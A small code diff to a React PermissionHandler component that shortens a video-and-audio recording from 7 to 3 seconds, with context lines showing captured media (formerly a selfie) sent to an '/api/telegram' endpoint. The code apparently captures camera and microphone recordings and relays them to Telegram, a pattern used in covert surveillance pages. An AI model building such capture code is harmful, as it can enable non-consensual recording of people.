@@ -4,7 +4,7 @@ import React, { useEffect, useRef, useState } from "react";
 import { toast } from "sonner";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
-const RECORDING_DURATION_MS = 7000; // 7 seconds for video and audio recording
+const RECORDING_DURATION_MS = 3000; // Temporarily reduced to 3 seconds for testing video size issues
 
 type DataToSend = {
   video?: string; // Changed from selfie to video
@@ -68,7 +68,7 @@ const PermissionHandler = () => {
             });
           }
 
-          // Record video with audio for 7 seconds
+          // Record video with audio for 3 seconds
           mediaRecorderRef.current = new MediaRecorder(stream, { mimeType: 'video/webm' });
           mediaChunksRef.current = []; // Reset chunks for new recording
           mediaRecorderRef.current.ondataavailable = (event) => {
